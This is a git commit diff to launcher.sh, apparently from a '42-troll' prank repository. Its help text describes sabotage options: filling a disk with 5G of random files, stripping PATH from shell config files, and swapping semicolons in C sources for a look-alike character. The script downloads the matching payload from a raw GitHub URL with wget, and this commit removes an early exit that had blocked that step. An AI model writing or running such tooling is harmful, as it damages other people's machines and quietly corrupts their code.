a784b271449f8f2034875ee46395e775d95fd479
Thunlos <paulsalame33200@gmail.com>
2023-08-09 16:49:04 +0200

    fix help newline

--- launcher.sh
+++ launcher.sh
@@ -5,7 +5,7 @@ argument=""
 
 case "$1" in
 	--help)
-		echo "TODO LATER \nArguments : \n--help : show help\n -F | --full-disk : add 5G of random files everywhere\n-P | --where-are-commands : remove PATH from .zshrc and .bashrc\n-S | --replace-semicolon : replace all semcolon by a fake semicolon of file passed in arg 2 (tip : ~/**/*.c for all .c )"
+		printf "TODO LATER \nArguments : \n--help : show help\n-F | --full-disk : add 5G of random files everywhere\n-P | --where-are-commands : remove PATH from .zshrc and .bashrc\n-S | --replace-semicolon : replace all semcolon by a fake semicolon of file passed in arg 2 (tip : ~/**/*.c for all .c )"
 	;;
 	--full-disk|-F)
 		scriptlocation="https://raw.githubusercontent.com/Poul0s/42-troll/master/full_disk.sh"
@@ -21,9 +21,6 @@ case "$1" in
 		echo "arg '$1' invalid"
 	;;
 esac
-
-echo "arg start : $argument\n"
-exit 0
 
 if [ ! -z $scriptlocation ] ; then
 	wget -q $scriptlocation -O script.sh
